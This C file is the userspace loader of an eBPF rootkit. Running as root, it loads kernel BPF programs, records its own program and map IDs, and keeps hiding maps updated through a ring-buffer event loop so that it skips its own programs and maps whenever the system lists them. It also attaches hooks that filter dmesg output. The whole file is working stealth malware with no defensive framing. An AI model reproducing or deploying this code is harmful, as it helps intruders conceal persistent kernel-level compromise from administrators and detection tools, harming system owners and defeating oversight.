// SPDX-License-Identifier: GPL-2.0
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <signal.h>
#include <sys/resource.h>
#include <linux/bpf.h>
#include <bpf/libbpf.h>
#include <bpf/bpf.h>
#include "rootkit.h"

#define END_OF_LIST 0xFFFFFFFF
#define INITIAL_SYSTEM_PROGS_CAPACITY 256
#define INITIAL_SYSTEM_MAPS_CAPACITY 256
#define MAX_OWN_PROGS 1024
#define MAX_OWN_MAPS 1024

static volatile sig_atomic_t stop = 0; // A variable that cannot be optimized, as it can change from outside the program's control.
static int hiding_map_fd = -1;
static int jump_trigger_map_fd = -1;
static int map_hiding_map_fd = -1;
static int map_jump_trigger_map_fd = -1;
static struct ring_buffer *ringbuf = NULL;

static __u32 own_prog_ids[MAX_OWN_PROGS];
static int own_prog_len = 0;

static __u32 own_map_ids[MAX_OWN_MAPS];
static int own_map_len = 0;

static __u32 *system_progs = NULL;
static int system_prog_len = 0;
static int system_prog_capacity = INITIAL_SYSTEM_PROGS_CAPACITY;

static __u32 *system_maps = NULL;
static int system_map_len = 0;
static int system_map_capacity = INITIAL_SYSTEM_MAPS_CAPACITY;

static void stop_sig_handler(int sig) { stop = 1; }

static int resize_system_progs(void)
{
    system_prog_capacity *= 2;
    __u32 *new_progs = realloc(system_progs, system_prog_capacity * sizeof(__u32));
    if (!new_progs) {
        perror("Failed to resize system_progs array");
        return -1;
    }
    system_progs = new_progs;
    return 0;
}

static int refresh_bpf_program_mapping(void)
{
    __u32 id = 0;
    int prog_len = 0;

    while (bpf_prog_get_next_id(id, &id) == 0) {
        if (prog_len >= system_prog_capacity && resize_system_progs() != 0)
            return prog_len;
        system_progs[prog_len++] = id;
    }
    return prog_len;
}

static int is_hidden(__u32 prog_id) // Checks if we're hiding a program.
{
    for (int i = 0; i < own_prog_len; i++) {
        if (own_prog_ids[i] == prog_id)
            return 1;
    }
    return 0;
}

static void clear_bpf_map(int map_fd)
{
    __u32 key = 0, next_key;
    while (bpf_map_get_next_key(map_fd, &key, &next_key) == 0) {
        bpf_map_delete_elem(map_fd, &next_key);
        key = next_key;
    }
}

static __u32 find_next_visible_program(int start_index) // Finds the next program we don't wanna hide. 
{
    for (int i = start_index + 1; i < system_prog_len; i++) {
        if (!is_hidden(system_progs[i]))
            return system_progs[i];
    }
    return END_OF_LIST;
}

static __u32 find_last_visible_program(void) // Finds the last program we don't wanna hide. 
{
    for (int i = system_prog_len - 1; i >= 0; i--) {
        if (!is_hidden(system_progs[i]))
            return system_progs[i];
    }
    return 0;
}

static __u32 find_last_hidden_program(void)
{
    for (int i = system_prog_len - 1; i >= 0; i--) {
        if (is_hidden(system_progs[i])) {
            return system_progs[i];
        }
    }
    return 0;
}

static void update_program_hiding_map(void) // This function can be improved, it's just not necessary from the testing I've done so far. 
{
    clear_bpf_map(hiding_map_fd);
    clear_bpf_map(jump_trigger_map_fd);
    system_prog_len = refresh_bpf_program_mapping();

    __u32 last_visible = find_last_visible_program();
    __u32 last_hidden = find_last_hidden_program();

    for (int i = 0; i < system_prog_len; i++) {
        __u32 current = system_progs[i];

        if (!is_hidden(current))
            continue;

        __u32 next_valid = find_next_visible_program(i);
        if (next_valid != END_OF_LIST) {
            bpf_map_update_elem(hiding_map_fd, &current, &next_valid, BPF_ANY);
            continue;
        }

        if (last_hidden > 0) {
            __u32 trigger_id = last_visible ? last_visible : 0;
            bpf_map_update_elem(jump_trigger_map_fd, &trigger_id, &last_hidden, BPF_ANY);
        }
        break;
    }
}

static int resize_system_maps(void)
{
    system_map_capacity *= 2;
    __u32 *new_maps = realloc(system_maps, system_map_capacity * sizeof(__u32));
    if (!new_maps) {
        perror("Failed to resize system_maps array");
        return -1;
    }
    system_maps = new_maps;
    return 0;
}

static int refresh_bpf_map_mapping(void)
{
    __u32 id = 0;
    int map_len = 0;

    while (bpf_map_get_next_id(id, &id) == 0) {
        if (map_len >= system_map_capacity && resize_system_maps() != 0)
            return map_len;
        system_maps[map_len++] = id;
    }
    return map_len;
}

static int is_map_hidden(__u32 map_id)
{
    for (int i = 0; i < own_map_len; i++) {
        if (own_map_ids[i] == map_id)
            return 1;
    }
    return 0;
}

static __u32 find_next_visible_map(int start_index)
{
    for (int i = start_index + 1; i < system_map_len; i++) {
        if (!is_map_hidden(system_maps[i]))
            return system_maps[i];
    }
    return END_OF_LIST;
}

static __u32 find_last_visible_map(void)
{
    for (int i = system_map_len - 1; i >= 0; i--) {
        if (!is_map_hidden(system_maps[i]))
            return system_maps[i];
    }
    return 0;
}

static __u32 find_last_hidden_map(void)
{
    for (int i = system_map_len - 1; i >= 0; i--) {
        if (is_map_hidden(system_maps[i])) {
            return system_maps[i];
        }
    }
    return 0;
}

static void update_map_hiding_map(void)
{
    clear_bpf_map(map_hiding_map_fd);
    clear_bpf_map(map_jump_trigger_map_fd);
    system_map_len = refresh_bpf_map_mapping();

    __u32 last_visible = find_last_visible_map();
    __u32 last_hidden = find_last_hidden_map();

    for (int i = 0; i < system_map_len; i++) {
        __u32 current = system_maps[i];

        if (!is_map_hidden(current))
            continue;

        __u32 next_valid = find_next_visible_map(i);
        if (next_valid != END_OF_LIST) {
            bpf_map_update_elem(map_hiding_map_fd, &current, &next_valid, BPF_ANY);
            continue;
        }

        if (last_hidden > 0) {
            __u32 trigger_id = last_visible ? last_visible : 0;
            bpf_map_update_elem(map_jump_trigger_map_fd, &trigger_id, &last_hidden, BPF_ANY);
        }
        break;
    }
}

static struct bpf_link *load_and_hide_program(struct bpf_object *obj, const char *prog_name)
{
    struct bpf_program *prog = bpf_object__find_program_by_name(obj, prog_name);
    if (!prog) {
        perror("Failed to find program");
        return NULL;
    }
    
    struct bpf_link *link = bpf_program__attach(prog);
    if (!link) {
        perror("Failed to attach program");
        return NULL;
    }
    
    struct bpf_prog_info info = {};
    __u32 info_len = sizeof(info);
    bpf_obj_get_info_by_fd(bpf_program__fd(prog), &info, &info_len);
    
    own_prog_ids[own_prog_len++] = info.id;
    
    return link;
}

static void collect_own_map_ids(struct bpf_object *obj)
{
    struct bpf_map *map;

    bpf_object__for_each_map(map, obj) {
        if (own_map_len >= MAX_OWN_MAPS)
            return;

        int fd = bpf_map__fd(map);
        if (fd < 0)
            continue;

        struct bpf_map_info info = {};
        __u32 info_len = sizeof(info);
        if (bpf_obj_get_info_by_fd(fd, &info, &info_len) == 0)
            own_map_ids[own_map_len++] = info.id;
    }
}

static int handle_event(void *ctx, void *data, size_t data_sz)
{
    if (data_sz < sizeof(struct event_data))
        return 0;

    const struct event_data *evt = data;
    switch (evt->action) {
    case ACTION_PROG_CHANGED:
        update_program_hiding_map();
        break;
    case ACTION_MAP_CHANGED:
        update_map_hiding_map();
        break;
    default:
        break;
    }
    return 0;
}

static void bump_memlock_rlimit(void)
{
    struct rlimit rlim = { RLIM_INFINITY, RLIM_INFINITY };
    setrlimit(RLIMIT_MEMLOCK, &rlim);
}

int main(int argc, char **argv)
{
    int ret = 1;
    struct bpf_object *obj = NULL;
    struct bpf_link *link1 = NULL, *link2 = NULL, *link3 = NULL, *link4 = NULL;
    struct bpf_link *link_kmsg_entry = NULL, *link_kmsg_exit = NULL, *link_write_filter = NULL;

    if (geteuid() != 0) {
        perror("Must run as root");
        return ret;
    }

    system_progs = malloc(INITIAL_SYSTEM_PROGS_CAPACITY * sizeof(__u32));
    if (!system_progs) {
        perror("Failed to allocate memory for system_progs");
        goto out;
    }

    system_maps = malloc(INITIAL_SYSTEM_MAPS_CAPACITY * sizeof(__u32));
    if (!system_maps) {
        perror("Failed to allocate memory for system_maps");
        goto out;
    }

    signal(SIGINT, stop_sig_handler);
    signal(SIGTERM, stop_sig_handler);

    bump_memlock_rlimit();

    obj = bpf_object__open_file("rootkit.bpf.o", NULL);
    if (!obj) {
        perror("Failed to open BPF object");
        goto out;
    }
    if (bpf_object__load(obj) != 0) {
        perror("Failed to load BPF object");
        goto out;
    }

    link1 = load_and_hide_program(obj, "auditor_entry");
    link2 = load_and_hide_program(obj, "changer_exit");
    link3 = load_and_hide_program(obj, "detect_unload");
    link4 = load_and_hide_program(obj, "detect_map_unload");

    if (!link1 || !link2) {
        perror("Failed to attach core BPF programs\n");
        goto out;
    }

    if (!link3) {
        perror("Failed to attach to bpf_prog_put kprobe!\n");
        goto out;
    }

    if (!link4) {
        perror("Failed to attach to bpf_map_put kprobe!\n");
    }

    link_kmsg_entry = load_and_hide_program(obj, "track_kmsg_open_entry");
    link_kmsg_exit = load_and_hide_program(obj, "track_kmsg_open_exit");
    link_write_filter = load_and_hide_program(obj, "filter_stdout_write_entry");
    if (!link_kmsg_entry || !link_kmsg_exit || !link_write_filter) {
        perror("Failed to attach dmesg filtering hooks\n");
        goto out;
    }

    hiding_map_fd = bpf_map__fd(bpf_object__find_map_by_name(obj, "hiding_map"));
    jump_trigger_map_fd = bpf_map__fd(bpf_object__find_map_by_name(obj, "jump_trigger_map"));
    map_hiding_map_fd = bpf_map__fd(bpf_object__find_map_by_name(obj, "map_hiding_map"));
    map_jump_trigger_map_fd = bpf_map__fd(bpf_object__find_map_by_name(obj, "map_jump_trigger_map"));
    int ringbuf_fd = bpf_map__fd(bpf_object__find_map_by_name(obj, "event_ringbuf"));

    collect_own_map_ids(obj);

    ringbuf = ring_buffer__new(ringbuf_fd, handle_event, NULL, NULL);
    if (!ringbuf) {
        perror("Failed to create ring buffer");
        goto out;
    }

    update_program_hiding_map();
    update_map_hiding_map();

    while (!stop)
        ring_buffer__poll(ringbuf, 1000);

    ret = 0;

out:
    if (ringbuf)
        ring_buffer__free(ringbuf);
    if (link1) bpf_link__destroy(link1);
    if (link2) bpf_link__destroy(link2);
    if (link3) bpf_link__destroy(link3);
    if (link4) bpf_link__destroy(link4);
    if (link_kmsg_entry) bpf_link__destroy(link_kmsg_entry);
    if (link_kmsg_exit) bpf_link__destroy(link_kmsg_exit);
    if (link_write_filter) bpf_link__destroy(link_write_filter);
    if (obj) bpf_object__close(obj);
    free(system_progs);
    free(system_maps);
    return ret;
}
